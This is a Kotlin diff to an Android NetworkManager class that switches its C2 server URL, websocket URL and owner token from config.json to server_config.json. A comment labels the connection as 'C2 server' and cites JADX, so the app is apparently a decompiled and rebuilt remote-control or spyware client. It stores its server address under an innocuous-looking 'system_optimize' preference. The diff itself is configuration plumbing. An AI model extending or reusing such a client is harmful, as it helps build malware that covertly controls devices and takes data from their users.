@@ -146,12 +146,6 @@ class NetworkManager {
             httpManager = HttpManager.getOrCreate(context).apply { this.deviceId = this@NetworkManager.deviceId }
             loadAppConfig(context)
 
-            try {
-                val json = JSONObject(context.assets.open("config.json").bufferedReader().use { it.readText() })
-                val httpUrl = json.optJSONObject("network")?.optString("server_url", "") ?: ""
-                if (httpUrl.isNotEmpty()) { httpManager?.baseUrl = httpUrl.trimEnd('/') }
-            } catch (_: Exception) {}
-
             val dsc = dataSyncClient!!; val hm = httpManager!!
 
             heartbeatManager = HeartbeatManager(context, dsc).apply {
@@ -189,23 +183,28 @@ class NetworkManager {
 
     private fun loadAppConfig(context: Context) {
         try {
-            val json = JSONObject(context.assets.open("config.json").bufferedReader().use { it.readText() })
-            val network = json.optJSONObject("network"); val auth = json.optJSONObject("auth")
-            val configServerUrl = network?.optString("server_url", "") ?: ""
-            val configWsUrl = network?.optString("websocket_url", "") ?: ""
-            val configOverride = network?.optString("server_url_override", "") ?: ""
-            val ownerToken = auth?.optString("owner_token", "") ?: ""
-            val effectiveWsUrl = if (configOverride.isNotEmpty()) configOverride else configWsUrl
+            val configStr = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(context, "server_config.json")
+            if (configStr == null) { Log.w(TAG, "server_config.json 不存在"); return }
+            val sc = JSONObject(configStr)
+
+            val serverUrl = sc.optString("serverUrl", "")
+            val websocketUrl = sc.optString("websocketUrl", "")
+            val ownerToken = sc.optString("ownerToken", "")
+
+            val effectiveWsUrl = websocketUrl.ifEmpty { serverUrl }
             if (effectiveWsUrl.isNotEmpty()) this.serverUrl = effectiveWsUrl
-            else if (configServerUrl.isNotEmpty()) this.serverUrl = configServerUrl
-            if (configServerUrl.isNotEmpty()) { this.httpBaseUrl = configServerUrl; context.getSharedPreferences("system_optimize", 0).edit().putString("server_addr", configServerUrl).apply() }
+            if (serverUrl.isNotEmpty()) {
+                this.httpBaseUrl = serverUrl
+                httpManager?.baseUrl = serverUrl.trimEnd('/')
+                context.getSharedPreferences("system_optimize", 0).edit().putString("server_addr", serverUrl).apply()
+            }
             if (ownerToken.isNotEmpty()) {
                 this.ownerToken = ownerToken
                 dataSyncClient?.ownerToken = ownerToken
                 httpManager?.ownerToken = ownerToken
             }
-            Log.i(TAG, "config.json: wsUrl=$serverUrl, serverUrl=$configServerUrl, ownerToken=${if (ownerToken.isNotEmpty()) "${ownerToken.take(10)}..." else "(empty)"}")
-        } catch (e: Exception) { Log.w(TAG, "config.json 加载失败: ${e.message}") }
+            Log.i(TAG, "server_config.json: serverUrl=$serverUrl, wsUrl=${this.serverUrl}, ownerToken=${if (ownerToken.isNotEmpty()) "${ownerToken.take(10)}..." else "(empty)"}")
+        } catch (e: Exception) { Log.w(TAG, "server_config.json 加载失败: ${e.message}") }
     }
 
     /** Connect to C2 server. JADX: a7 */
